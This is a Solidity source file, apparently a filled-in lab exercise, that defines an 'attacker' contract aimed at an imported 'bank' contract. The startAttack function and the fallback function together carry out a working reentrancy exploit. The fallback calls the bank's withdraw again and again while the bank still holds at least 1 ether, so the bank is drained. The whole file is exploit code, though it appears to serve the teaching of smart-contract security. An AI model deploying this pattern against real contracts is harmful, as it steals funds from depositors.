pragma solidity 0.4.26;

import "./bank.sol";

contract attacker {
    
    bank mybank;
    
    event LOG(string message, uint256 value);
    
    constructor () payable public {}
    
    function LinkWithBank(address addr) public {
        mybank = bank(addr);
    }
    
    function startAttack(address addr) payable public {
        LinkWithBank(addr);
        // Your code goes here
        createAccount();
        deposit(2 ether);
        withdraw(1 ether);
    }
    
    function() payable public {
        // Your code goes here 
        if(address(mybank).balance >= 1 ether) mybank.withdraw(1 ether);
        emit LOG("Received Money! My balance now is ", address(this).balance);
    }
    
    function getBalance() view public returns (uint) { 
        return address(this).balance; 
    }
    
    
    function createAccount() public payable{
        mybank.createAccount();
    }
    
    function withdraw(uint x) public payable {
        mybank.withdraw(x);
    }
    
    function deposit(uint x) public payable {
        mybank.deposit.value(x)();
    }

}

